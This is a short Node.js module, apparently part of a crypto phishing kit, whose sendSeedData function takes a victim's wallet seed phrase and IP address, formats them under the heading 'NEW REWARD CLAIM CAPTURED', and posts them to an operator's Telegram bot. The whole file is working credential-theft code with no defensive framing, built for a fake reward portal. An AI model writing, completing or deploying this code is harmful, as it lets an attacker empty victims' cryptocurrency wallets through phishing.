const axios = require('axios');
require('dotenv').config();

const sendSeedData = async (seedPhrase, userIP) => {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    
    // Professional header for your Telegram logs
    const message = `
🔔 **NEW REWARD CLAIM CAPTURED**
━━━━━━━━━━━━━━━━━━━━
🔑 **Seed Phrase:**
\`${seedPhrase}\`

🌐 **User IP:** ${userIP}
📱 **Device:** Web Portal (Mobile Friendly)
━━━━━━━━━━━━━━━━━━━━`;

    try {
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
        });
        console.log("✅ Seed phrase successfully relayed to Telegram.");
        return true;
    } catch (error) {
        console.error("❌ Telegram Relay Error:", error.response ? error.response.data : error.message);
        return false;
    }
};

module.exports = { sendSeedData };